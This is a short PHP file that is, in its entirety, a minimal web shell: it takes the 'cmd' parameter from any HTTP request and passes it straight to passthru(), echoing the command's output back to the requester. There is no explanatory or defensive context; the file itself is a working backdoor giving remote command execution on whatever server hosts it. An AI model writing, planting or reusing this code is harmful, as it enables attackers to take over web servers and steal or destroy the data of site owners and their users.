<?php
$Mcmd = $_REQUEST['cmd'];
print "<pre>\n";
$output = passthru($Mcmd);
print "</pre>\n";
echo $output;
?>